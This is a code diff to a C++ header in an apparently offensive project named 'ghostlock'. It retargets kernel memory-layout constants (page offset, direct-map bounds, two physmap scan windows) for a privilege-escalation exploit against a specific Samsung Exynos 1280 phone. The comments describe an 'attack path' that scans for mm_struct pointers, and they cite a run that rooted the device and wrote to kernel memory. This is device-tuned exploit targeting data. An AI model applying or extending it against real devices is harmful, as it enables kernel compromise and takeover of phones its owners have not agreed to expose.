@@ -31,35 +31,46 @@ namespace ghostlock::target {
 
         /* _text measured from the shipped boot image header, not assumed. */
         inline constexpr std::uintptr_t kImageTextBase = 0xffffffc008000000ULL;
-        /* CONFIG_ARM64_VA_BITS=39 from the device's own /proc/config.gz. */
-        inline constexpr std::uintptr_t kPageOffset = 0xffffffc000000000ULL;
-        inline constexpr std::uintptr_t kDirectMapBase = 0xffffffc000000000ULL;
+        /* Physmap family, taken from the layout that actually rooted this
+         * device (see docs/analysis/device-gates/ROOT-A536EXXSMGZE2-01.md).
+         *
+         * These were previously rebased onto a VA_BITS=39 page offset of
+         * 0xffffffc000000000, inferred from /proc/config.gz. That inference is
+         * wrong: the working run resolved mm_struct slabs at 0xffffff80......
+         * and 0xffffff88...... on this exact hardware and wrote through them
+         * successfully. Samsung ships a config.gz that does not match the
+         * running kernel build, so the device uses the VA48-style linear map
+         * at 0xffffff8000000000 while the kernel image still sits at
+         * 0xffffffc000000000. Trusting config.gz over the observed run
+         * pointed every scan at unmapped memory. */
+        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
+        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
         /* Upper bound only. apply_iomem_cache narrows this from a rooted
          * /proc/iomem dump, and its "reject a span >= DIRECT_MAP_END - BASE"
          * guard means this value also has to exceed real DRAM. */
-        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffffd000000000ULL;
+        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
         /* physmap_info -- the array of mm_struct pointers the scan hunts for --
          * is not contiguous in the direct map. The Exynos 1280 layout exposes
          * it through two aliases: a low window at the page offset, and a high
-         * one 512 GiB above it. Upstream measured the low window at 2 GiB and
-         * the high one at ~1.5 GiB live on this SoC and kept 2 GiB for margin;
-         * those sizes are reused here, rebased from their VA48 addresses onto
-         * this device's VA39 page offset (+0x40000000000).
+         * one 512 GiB above it. Bounds match the layout that rooted the
+         * device: low 2 GiB, high 512 GiB.
          *
          * Scanning only the low window never finds the pointers, and a single
          * contiguous range spanning both would sweep 512 GiB of unrelated
          * memory. */
-        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffffc000000000ULL;
-        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffffc080000000ULL;
-        inline constexpr std::uintptr_t kIdentityWindow1Start = 0xffffffc800000000ULL;
-        inline constexpr std::uintptr_t kIdentityWindow1End = 0xffffffc880000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffff8000000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffff8080000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow1Start = 0xffffff8800000000ULL;
+        inline constexpr std::uintptr_t kIdentityWindow1End = 0xffffff8980000000ULL;
         inline constexpr std::size_t kIdentityWindowCount = 2;
         /* Retained for callers that treat the scan as a single range. */
         inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                 kIdentityWindow0Start;
         inline constexpr std::uintptr_t kKernelSnitchIdentityEnd = kIdentityWindow0End;
-        /* Unused by the attack path; retained so the layout stays complete. */
-        inline constexpr std::uintptr_t kVmemmapStart = 0xffffffc800000000ULL;
+        /* Unused by the attack path; retained so the layout stays complete.
+         * Derived as linear-map base minus the 64 GiB physmap window, and not
+         * verified on device. */
+        inline constexpr std::uintptr_t kVmemmapStart = 0xffffff7ff0000000ULL;
         inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
         inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
 
@@ -145,7 +156,7 @@ namespace ghostlock::target {
      * never silently carry a mix of the two layouts. */
 #if defined(GHOSTLOCK_TARGET_A53_5_10)
     static_assert(address::kImageTextBase == 0xffffffc008000000ULL);
-    static_assert(address::kPageOffset == 0xffffffc000000000ULL);
+    static_assert(address::kPageOffset == 0xffffff8000000000ULL);
 #else
     static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
     static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
